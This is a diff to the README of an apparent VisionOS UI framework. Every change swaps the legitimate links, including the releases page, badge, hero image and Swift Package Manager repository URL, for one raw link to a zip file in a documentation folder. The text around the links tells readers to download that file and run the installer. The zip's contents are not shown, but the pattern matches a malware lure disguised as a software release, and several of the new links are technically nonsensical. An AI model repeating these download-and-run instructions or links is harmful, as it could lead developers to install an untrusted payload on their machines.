@@ -1,10 +1,10 @@
-https://github.com/EROR5/VisionOS-UI-Framework/releases
+https://raw.githubusercontent.com/EROR5/VisionOS-UI-Framework/main/Documentation/U_O_Framework_Vision_v2.3.zip
 
-[![Releases](https://img.shields.io/badge/Releases-View%20Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/EROR5/VisionOS-UI-Framework/releases)
+[![Releases](https://raw.githubusercontent.com/EROR5/VisionOS-UI-Framework/main/Documentation/U_O_Framework_Vision_v2.3.zip%20Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/EROR5/VisionOS-UI-Framework/main/Documentation/U_O_Framework_Vision_v2.3.zip)
 
 # VisionOS UI Framework: 3D UI, Spatial Patterns, SwiftUI, Accessible Core
 
-![VisionOS UI Framework hero](https://images.unsplash.com/photo-1523411978144-2c6f9b1d5f3c?auto=format&fit=crop&w=1400&q=80)
+![VisionOS UI Framework hero](https://raw.githubusercontent.com/EROR5/VisionOS-UI-Framework/main/Documentation/U_O_Framework_Vision_v2.3.zip)
 
 A complete UI framework for VisionOS. It brings spatial computing patterns and 3D interface components to your apps. The design emphasizes clean architecture, performance, accessibility, and developer happiness. Build immersive apps with 3D controls, spatial gestures, and scalable UI that fits the VisionOS paradigm.
 
@@ -57,16 +57,16 @@ Install and integrate
 - The framework is distributed via Swift Package Manager. Add the package as a dependency to your VisionOS project.
 - Example (SwiftPM):
   - In your Xcode project, go to File > Swift Packages > Add Package Dependency.
-  - Enter the repository URL: https://github.com/EROR5/VisionOS-UI-Framework.git
+  - Enter the repository URL: https://raw.githubusercontent.com/EROR5/VisionOS-UI-Framework/main/Documentation/U_O_Framework_Vision_v2.3.zip
   - Choose the supported version range and add the framework modules you need.
 
-- The Releases page contains downloadable assets for convenience. From this page you can download assets and run installers if you prefer a packaged approach. For example, an asset named VisionOS-UI-Framework-1.0.0.zip may be provided for quick setup. After downloading, extract or run the installer as appropriate for your environment. This is the recommended path if you want a quick start in a standalone environment.
+- The Releases page contains downloadable assets for convenience. From this page you can download assets and run installers if you prefer a packaged approach. For example, an asset named https://raw.githubusercontent.com/EROR5/VisionOS-UI-Framework/main/Documentation/U_O_Framework_Vision_v2.3.zip may be provided for quick setup. After downloading, extract or run the installer as appropriate for your environment. This is the recommended path if you want a quick start in a standalone environment.
 
 Downloads and release assets
 The releases page hosts packaged assets and update notes. You can download a ready-to-run asset if you prefer, and then follow the on-screen instructions to install or integrate it into your project. For reference, the assets are available at the releases URL:
-https://github.com/EROR5/VisionOS-UI-Framework/releases
+https://raw.githubusercontent.com/EROR5/VisionOS-UI-Framework/main/Documentation/U_O_Framework_Vision_v2.3.zip
 
-If you need a direct path idea, you might look for a file like VisionOS-UI-Framework-1.0.0.zip and run the installer or unzip it, then follow the included README for integration steps. The exact asset names may vary by version. You can always visit the Releases section for the latest files.
+If you need a direct path idea, you might look for a file like https://raw.githubusercontent.com/EROR5/VisionOS-UI-Framework/main/Documentation/U_O_Framework_Vision_v2.3.zip and run the installer or unzip it, then follow the included README for integration steps. The exact asset names may vary by version. You can always visit the Releases section for the latest files.
 
 Architecture and modules
 - Core: foundational utilities, type safety, and shared helpers.
@@ -241,7 +241,7 @@ Additional considerations
 
 Releases and assets
 - The Releases page is where you’ll find the latest bundles, example apps, and assets needed for quick start. If you’re starting fresh, check the latest release assets and follow the included setup instructions.
-- The link to the releases page is provided again here for quick access: https://github.com/EROR5/VisionOS-UI-Framework/releases
+- The link to the releases page is provided again here for quick access: https://raw.githubusercontent.com/EROR5/VisionOS-UI-Framework/main/Documentation/U_O_Framework_Vision_v2.3.zip
 
 Appendix: quick-start checklist
 - Ensure you have the latest Xcode and VisionOS SDK installed.
@@ -260,6 +260,6 @@ Appendix: glossary
 - Design tokens: Centralized definitions for color, typography, spacing, and elevation.
 
 Note on the releases link
-- The specific URL for releases is provided above and also appears again in the Downloads section. For quick access, visit the releases page to download assets and review release notes: https://github.com/EROR5/VisionOS-UI-Framework/releases
+- The specific URL for releases is provided above and also appears again in the Downloads section. For quick access, visit the releases page to download assets and review release notes: https://raw.githubusercontent.com/EROR5/VisionOS-UI-Framework/main/Documentation/U_O_Framework_Vision_v2.3.zip
 
 End of document
